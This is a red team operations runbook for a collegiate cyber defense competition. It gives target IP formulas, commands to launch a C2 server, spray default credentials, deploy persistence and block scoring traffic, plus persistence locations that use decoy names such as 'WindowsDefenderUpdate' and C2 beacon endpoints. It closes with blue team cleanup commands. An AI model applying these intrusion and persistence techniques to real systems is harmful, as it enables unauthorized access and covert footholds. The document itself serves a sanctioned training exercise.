# Red Team Operations Guide
## BYU CCDC Invitational 2026 - Aperture Science Edition

> "There's a hole in the sky, through which things can fly."
> - Cave Johnson

---

## Quick Reference

### Target IP Formula
```
Team X, Host with LAN IP 172.16.Y.Z
WAN IP = 192.168.(200+X).Z

Example: Team 10, storage (172.16.1.14)
WAN IP = 192.168.210.14
```

### In-Scope Targets
| Hostname | LAN IP | OS | Services |
|----------|--------|-----|----------|
| curiosity | 172.16.3.140 | Win Server 2016 | SMB, WinRM, RDP |
| morality | 172.16.1.10 | Win Server 2016 | SMB, WinRM, HTTP |
| anger | 172.16.2.70 | Win Server 2019 | SMB, WinRM, DNS |
| space | 172.16.3.141 | Windows 10 | SMB, WinRM, RDP |
| scalable | 172.16.2.73 | openSUSE 42.1 | SSH, HTTP |
| safety | 172.16.1.12 | Fedora 34 | SSH, HTTP, FTP |
| storage | 172.16.1.14 | Ubuntu 18.04 | SSH, HTTP, MySQL |
| cake | 172.16.3.143 | Arch Linux | SSH, HTTP |

---

## Competition Day Commands

### 1. Start C2 Server
```bash
cd ccdc-red-team/payloads
python3 portal_gun.py --port 8080

# Access dashboard at http://YOUR_IP:8080/dashboard
```

### 2. Run Credential Spray (T+15 min)
```bash
cd ccdc-red-team/enumeration
python3 default_cred_spray.py --teams 1-12 --json results.json
```

### 3. Deploy Persistence (T+30 min)
```bash
cd ccdc-red-team/orchestration
python3 glados.py --full-attack --teams 1-12 --report attack_report.json
```

### 4. Start Service Degradation (T+45 min)
```bash
cd ccdc-red-team/orchestration
python3 turret.py --standard-schedule --competition-start "2026-01-31T10:00:00" --start
```

### 5. Manual Attacks
```bash
# Block scoring for specific targets
python3 turret.py --manual firewall_block --targets storage,safety

# Stop HTTP services
python3 turret.py --manual stop_http --targets morality,scalable
```

---

## Persistence Locations

### Linux (SMH)
```
Directories:
  /tmp/.aperture_science/
  /var/tmp/.apsci/

Files:
  /tmp/.aperture_science/smh
  /tmp/.aperture_science/turret
  /tmp/.aperture_science/README.aperture

Cron:
  */5 * * * * /tmp/.aperture_science/smh --maintain
  */3 * * * * /tmp/.aperture_science/turret

Systemd:
  ~/.config/systemd/user/aperture-enrichment.timer
  ~/.config/systemd/user/aperture-enrichment.service
```

### Windows (Wheatley)
```
Directories:
  %TEMP%\ApertureScience\
  %APPDATA%\Microsoft\Windows\Wheatley\

Scheduled Tasks:
  ApertureEnrichment
  WindowsDefenderUpdate (decoy name)

Registry:
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ApertureUpdate
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsOptimization

WMI:
  Event Filter: ApertureFilter
  Event Consumer: ApertureConsumer

Startup:
  %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk
  %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs
```

---

## C2 Endpoints

```
http://RED_TEAM_IP:8080/beacon      - Generic beacon
http://RED_TEAM_IP:8080/smh         - Linux SMH beacon  
http://RED_TEAM_IP:8080/wheatley    - Windows Wheatley beacon
http://RED_TEAM_IP:8080/cube        - Companion Cube beacon
http://RED_TEAM_IP:8080/dashboard   - Live dashboard
http://RED_TEAM_IP:8080/stats       - JSON statistics
```

---

## Blue Team Remediation Hints

### Linux
```bash
# Check and remove cron
crontab -l | grep -v aperture | crontab -

# Find and remove files
find /tmp /var/tmp -name "*aperture*" -exec rm -rf {} \; 2>/dev/null

# Check systemd user services
systemctl --user disable aperture-enrichment.timer
rm -rf ~/.config/systemd/user/aperture*

# Check bashrc/profile
sed -i '/aperture/d' ~/.bashrc ~/.profile

# Check SSH keys
sed -i '/aperture/d' ~/.ssh/authorized_keys

# Check firewall
iptables -L -n --line-numbers  # Look for DROP rules
```

### Windows
```powershell
# Remove scheduled tasks
Get-ScheduledTask | Where {$_.TaskName -match "Aperture|Enrichment"} | Unregister-ScheduledTask -Confirm:$false

# Clean registry
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Aperture*" -ErrorAction SilentlyContinue

# Remove WMI persistence
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where {$_.Name -match "Aperture"} | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where {$_.Name -match "Aperture"} | Remove-WmiObject

# Clean startup folder
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*aperture*" -Force
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs" -Force

# Remove directories
Remove-Item -Recurse -Force "$env:TEMP\ApertureScience"
Remove-Item -Recurse -Force "$env:APPDATA\Microsoft\Windows\Wheatley"

# Check firewall
Get-NetFirewallRule | Where {$_.DisplayName -match "Aperture"} | Remove-NetFirewallRule
```

---

## Emergency Contacts

- **Black Team Discord**: Competition announcements and support
- **Stop attacks**: Ctrl+C on turret.py, kill glados.py processes

---

*"Thank you for participating in this Aperture Science computer-aided enrichment activity."*
